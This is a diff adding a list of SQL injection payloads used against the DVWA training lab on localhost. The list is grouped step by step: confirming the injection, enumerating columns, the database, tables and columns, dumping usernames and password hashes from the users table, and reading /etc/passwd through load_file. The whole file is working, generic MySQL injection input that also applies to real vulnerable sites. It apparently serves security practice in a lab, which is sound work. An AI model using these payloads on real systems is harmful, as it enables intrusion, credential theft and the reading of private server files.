@@ -1,0 +1,36 @@
+# SQL Injection Payloads — DVWA Lab
+# Used against: http://localhost/dvwa/vulnerabilities/sqli/?id=<PAYLOAD>&Submit=Submit
+
+# --- Error-based / Confirmation ---
+1'                                          # Confirm injection (MySQL error)
+1' OR '1'='1                                # Return all rows
+
+# --- Column enumeration ---
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' ORDER BY 3--                             # Error = 2 columns exist
+
+# --- Output column identification ---
+1' UNION SELECT NULL,NULL--
+1' UNION SELECT 1,2--
+
+# --- Database enumeration ---
+1' UNION SELECT database(),2--                                                              # DB name
+1' UNION SELECT user(),2--                                                                  # DB user
+1' UNION SELECT @@version,2--                                                               # MySQL version
+
+# --- Table enumeration ---
+1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()--
+
+# --- Column enumeration ---
+1' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'--
+
+# --- Credential dump ---
+1' UNION SELECT user,password FROM users--
+1' UNION SELECT user,password FROM dvwa.users--
+
+# --- Stacked data ---
+1' UNION SELECT concat(user,':',password),2 FROM users--
+
+# --- File read (if FILE privilege granted) ---
+1' UNION SELECT load_file('/etc/passwd'),2--
